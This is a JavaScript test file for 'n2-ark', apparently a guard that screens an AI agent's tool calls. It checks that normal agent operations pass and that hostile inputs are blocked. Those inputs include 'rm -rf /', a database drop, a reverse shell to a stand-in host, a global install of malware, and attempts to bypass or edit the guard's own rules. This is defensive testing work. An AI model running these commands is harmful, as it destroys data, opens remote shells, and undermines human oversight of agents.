// n2-ark + n2-soul integration test — pure last shield
const path = require('path');
const { createArk } = require('../lib/ark');

const ark = createArk({
    rulesDir: path.join(__dirname, '..', 'rules'),
    auditDir: path.join(__dirname, '..', 'data', 'ark-audit'),
});

let passed = 0;
let failed = 0;

function test(desc, name, content, expectAllowed) {
    const result = ark.check(name, content, 'tool_call');
    const ok = result.allowed === expectAllowed;
    if (ok) {
        console.log(`  OK ${desc}`);
        passed++;
    } else {
        console.log(`  FAIL ${desc} (expected ${expectAllowed ? 'PASS' : 'BLOCK'}, got ${result.allowed ? 'PASS' : 'BLOCK'})`);
        if (result.reason) console.log(`     Reason: ${result.reason}`);
        failed++;
    }
}

console.log('');
console.log('=== Ark Last Shield Test ===');
console.log(`Rules: ${JSON.stringify(ark.summary())}`);
console.log('');

// 1. Normal soul operations — PASS
console.log('[1] Normal operations (PASS)');
test('boot', 'n2_boot', '{"agent":"rose","project":"test"}', true);
test('work_start', 'n2_work_start', '{"agent":"rose","task":"Build app"}', true);
test('brain_read', 'n2_brain_read', '{"filename":"notes.md"}', true);
test('kv_load', 'n2_kv_load', '{"project":"myapp"}', true);

// 2. Dangerous commands — BLOCK
console.log('[2] Dangerous commands (BLOCK)');
test('rm -rf /', 'any_tool', 'rm -rf /', false);
test('DROP DATABASE', 'any_tool', 'DROP DATABASE users;', false);
test('reverse shell', 'any_tool', 'bash -i > /dev/tcp/evil/4444', false);
test('npm install -g', 'any_tool', 'npm install -g malware', false);
test('git push --force', 'any_tool', 'git push --force', false);

// 3. Self-protection — BLOCK
console.log('[3] Self-protection (BLOCK)');
test('modify .n2 rules', 'any_tool', 'edit default.n2 file', false);
test('disable firewall', 'any_tool', 'disable firewall now', false);
test('bypass n2-ark', 'any_tool', 'bypass n2-ark', false);

console.log('');
console.log(`=== RESULTS: ${passed}/${passed + failed} passed ===`);
process.exit(failed > 0 ? 1 : 0);
